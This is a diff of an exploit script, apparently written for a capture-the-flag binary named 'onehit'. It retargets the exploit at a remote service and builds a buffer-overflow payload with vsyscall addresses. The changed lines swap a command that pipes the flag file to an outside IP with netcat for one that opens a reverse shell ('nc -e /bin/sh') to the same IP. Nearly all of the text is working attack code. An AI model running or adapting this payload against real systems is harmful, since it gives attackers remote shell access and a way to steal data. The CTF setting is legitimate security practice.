@@ -8,8 +8,9 @@ context.binary = "./onehit"
 context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
-io = process("./onehit", env = {"LD_PRELOAD": "./libc-2.27.so"})
+#  io = process("./onehit", env = {"LD_PRELOAD": "./libc-2.27.so"})
 #  io = remote("localhost", 9999)
+io = remote("10.4.21.55", 7777)
 
 def DEBUG(bps = []):
     cmd = "set follow-fork-mode parent\n"
@@ -41,8 +42,8 @@ if __name__ == "__main__":
     .text:000000000004F43E                 jmp     short loc_4F45B
     '''
     vsyscall = 0xffffffffff600000
-    cmd = "cat flag| nc 123.207.141.87 9999 ;"
-    #  cmd = "/bin/sh <&2 >&2\0"
+    #  cmd = "cat flag| nc 123.207.141.87 9999 ;"
+    cmd = ">&2 <&2 nc -e /bin/sh 123.207.141.87 9999;"
     payload = '\0' * (0x7f + 0x10) + cmd 
     payload = payload.ljust(0xE0 + 8, '\0') + p64(vsyscall) * 20 + '\x3a'
 
